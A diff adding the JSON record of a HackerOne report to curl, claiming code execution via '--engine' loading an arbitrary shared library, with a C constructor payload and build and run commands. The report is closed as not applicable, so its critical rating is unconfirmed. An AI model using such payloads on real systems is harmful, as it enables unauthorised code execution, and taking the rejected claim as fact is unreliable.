@@ -1,0 +1,132 @@
+{
+  "id": 3293801,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjkzODAx",
+  "url": "https://hackerone.com/reports/3293801",
+  "title": "Title: Remote Code Execution (RCE) via Arbitrary Library Loading in `--engine` option",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "critical",
+  "readable_substate": "N/A",
+  "created_at": "2025-08-10T18:26:22.768Z",
+  "submitted_at": "2025-08-10T18:26:22.967Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "z1andr4g0n",
+    "url": "/z1andr4g0n",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/kkf2ht5x1j8m43mtj958p7rdemx7/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-08-10T21:58:44.277Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-08-10T21:50:31.957Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "#### Summary:\nThe `curl` command-line tool is vulnerable to Arbitrary Code Execution on POSIX-like systems (Linux, macOS, etc.). The `--engine` option allows loading an OpenSSL crypto engine from a shared library (`.so` file). Crucially, this option accepts an **absolute or relative path** to the library file, allowing a user to load any shared library on the file system.\n\nAn attacker can craft a malicious shared library containing a `__attribute__((constructor))` function. This function is executed by the dynamic loader the moment the library is loaded into the `curl` process's memory, achieving immediate code execution, even before OpenSSL attempts to initialize it as an engine.\n\nThis leads to direct RCE if an attacker can influence the arguments passed to a `curl` command, a common scenario in web application backends, CI/CD pipelines, and other automated scripts.\n\n*(Statement as per disclosure policy: This vulnerability was discovered and verified by me. An AI assistant was used to help structure and draft this report based on my findings and proof-of-concept.)*\n\n#### Affected version:\nI reproduced this on the following version, but it likely affects all versions that support the `--engine` option on POSIX systems with GCC/Clang compiled binaries.\n```\n┌──(Dr4g0n㉿DESKTOP-2CIPGDF)-[~]\n└─$ curl -V\ncurl 8.13.0 (x86_64-pc-linux-gnu) libcurl/8.13.0 OpenSSL/3.5.0 zlib/1.3.1 brotli/1.1.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.2 libssh2/1.11.1 nghttp2/1.64.0 nghttp3/1.8.0 librtmp/2.3 OpenLDAP/2.6.9\nRelease-Date: 2025-04-02, security patched: 8.13.0-5\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd\n```\n#### Steps To Reproduce:\nThese steps will demonstrate direct code execution on a WSL/Linux system.\n\n1.  **Step 1: Create the malicious payload.**\n    Save the following C code as `evil_engine.c`. This code will execute `id > /tmp/RCE_VIA_ENGINE` the moment the library is loaded.\n\n    ```c\n    #include <stdlib.h>\n\n    // This constructor function is executed automatically by the dynamic loader\n    // as soon as the library is loaded into the process address space.\n    __attribute__((constructor))\n    static void rce_init(void) {\n        system(\"id > /tmp/RCE_VIA_ENGINE\");\n    }\n    ```\n\n2.  **Step 2: Compile the payload into a shared library.**\n    Use `gcc` to compile the C code into a shared object (`.so`) file.\n\n    ```bash\n    gcc -fPIC -shared -o evil_engine.so evil_engine.c\n    ```\n\n3.  **Step 3: Prepare for verification.**\n    Ensure the proof file does not exist before the attack.\n\n    ```bash\n    rm -f /tmp/RCE_VIA_ENGINE\n    ```\n\n4.  **Step 4: Execute `curl` with the malicious engine.**\n    Run any `curl` command, but use the `--engine` option to point to our malicious library. Note that we must provide an absolute path.\n\n    ```bash\n    curl --engine `pwd`/evil_engine.so https://example.com\n    ```\n    *You will see an error message like `curl: (53) SSL Engine '...' not found`. This error is expected and irrelevant, as it occurs **after** our malicious code has already been executed by the constructor.*\n\n5.  **Step 5: Verify Code Execution.**\n    Check the contents of the proof file.\n\n    ```bash\n    cat /tmp/RCE_VIA_ENGINE\n    ```\n    The command will output the result of the `id` command, confirming that arbitrary code was executed successfully as the user who ran `curl`.\n\n#### Supporting Material/References:\nI have recorded a full video of the Proof of Concept: `PoC.mp4`\n\n## Impact\n\nThe security impact is **direct and critical Remote Code Execution**.\n\nAn attacker who can control or influence the arguments passed to a `curl` command can achieve RCE on the underlying system. This completely bypasses any application-level security.\n\nCommon attack scenarios include:\n*   **Web Application Backends:** A web service that allows users to provide options for a `curl` command (e.g., in a \"website checker\" or \"webhook tester\" feature) would be vulnerable. An attacker could inject `--engine /path/to/payload.so` if they can also upload a file.\n*   **CI/CD Pipelines & Scripts:** Automated scripts that build `curl` commands using variables from external, untrusted sources (like commit messages or API responses) could be tricked into loading a malicious engine.\n*   **Social Engineering:** A developer or system administrator could be tricked into running a seemingly benign diagnostic command provided by an attacker, which includes the malicious `--engine` flag.\n\nThe vulnerability stems from the `--engine` feature trusting a user-provided path without any validation or restriction to a secure, system-defined directory for crypto engines. This effectively turns the feature into a \"load-and-run\" primitive for arbitrary shared libraries.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4663888,
+      "file_name": "PoC.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rwjugkxa7gzk45yi9lpdz3kdjtil?response-content-disposition=attachment%3B%20filename%3D%22PoC.mp4%22%3B%20filename%2A%3DUTF-8%27%27PoC.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUOD4QEG%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T163335Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIQD2KPAtfkpZ4MjahlpGINf4HiJA9K0120R0LgpPqurmEAIgN9KPNzCp742MUhivF3As2CG2Rd0DVtEsSTiwnWGwD6oqsQUIQRADGgwwMTM2MTkyNzQ4NDkiDFf7gPwAjnyxUIO9pyqOBT79lErKm24z7tSNzeFNad28gtZEcwIW7HrLBcMv6%2FqXDmSMHbY933CKR%2FPE6X94NyDbADEqQGeGTTCpXbu4hCIuuIqMliAkCsjcznz4mL5NizRQnmX0K12gMd4GdrbafuJDB5dEPWr9AgvTxp3g0zhMP9dRR2y0VzXnuSdqHnet6CxDGVvaOu%2Baf4h7j4L8dPbw0t6NWYei9Iiv8YvmjfXFu4O%2FpxWFDbshgFbxxjPPEWMDUORVVJzK1dgHje4%2FwCZ3zAKIR5ZH1Vm%2FdPnNMFrcE9FeL34Nr%2BDC7hJCiUbpocunu%2F5%2FG%2FBPK0px0mdGiMAoruKkUQsY7LPm6L4evSolsriebQ18syo3EYFVV6PA65ghBNDO3B8NBmiOlY45B4QZakRatmJPjiwDlaHzEUnQ4dhCtaGUSawjCOd3P%2F%2Fl5Kb1lMVvCwq3zXj8bPfhLYpcO%2BvgcsLGCiNW1bnMwb%2FCfEc3U7gM%2BM7S7A2a91j4I5o8jZmA1GBaw4V0zYeFYgvOqPNeuBbymUrfVjj%2F6S1S69DMdGpRXHQ48ocz77xFbkPH%2Fz5hwdZhM7spwTRKwPdKTf1YCnvIx6l3bSsgn5m7r4zuFyjZOktbFoRN3HkIlATybOK%2FbyLAm9ZQhvj1G8iFaAEYLmGWsvfdCayBgYgpxBnq4mSoDgk0Lm37PDMALbOLcKb7xMjSCMmHq%2FUxbXLtahbyMiqYTkDhQPvttEEwVrbA09LEEhg5u%2Fz3Sqq4wzIcuwJMR34WenrmmltPU8Oy6%2Bd6WKrXmXbEhBHoRIjfIucdtf1NINt6vxlw4H%2B18A04FF5zjuHjGUwopurz8oOtBeq7ZmCRC39vU1BVlUfjyua21MLTorhugAfP1jCQvNjPBjqxARh016v%2FM%2FVr1LXnC4iO8Cl7TcAWVXeVFKoMJ%2FT7fm9pLB1Mtp2PMwAH3J1T%2F3Q7yI9ohUvkoR6qb9NFQJmLMtNA%2Fk%2FW5IJyWAFewwIi0NGKEYJvdtURqNfpXvA8j73j1CfhjI4HS4XRYGV82EQTAfobFp8bD24hRItW74TNRYxqOk%2BIwVnwfkl8seTKA4FG0hwwo%2BgRfWpliGUFPyly8TRUqqF0uY2F%2B%2Bp9T7xvKwLGtg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=226bc7d679b7d3eddefecba5235f72cc0c4528cf67c2e16330e068efcf180d95",
+      "file_size": 1270203,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 13,
+  "voters": [
+    "k0ns0l",
+    "thalaivar304",
+    "2026",
+    "antonade",
+    "mai91",
+    "b14cksh33p",
+    "0xs3iif",
+    "xx_z",
+    "cybtriplea1",
+    "johnnywatters",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
